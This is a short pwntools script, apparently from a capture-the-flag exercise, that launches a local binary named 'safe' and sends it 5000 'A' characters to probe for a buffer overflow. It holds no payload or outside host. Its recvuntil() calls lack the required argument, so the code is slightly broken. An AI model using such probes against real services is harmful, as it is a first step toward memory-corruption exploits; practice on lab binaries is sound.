from pwn import *

p = process('./safe')
print(p.recvuntil())
p.send('A'*5000)
print(p.recvuntil())
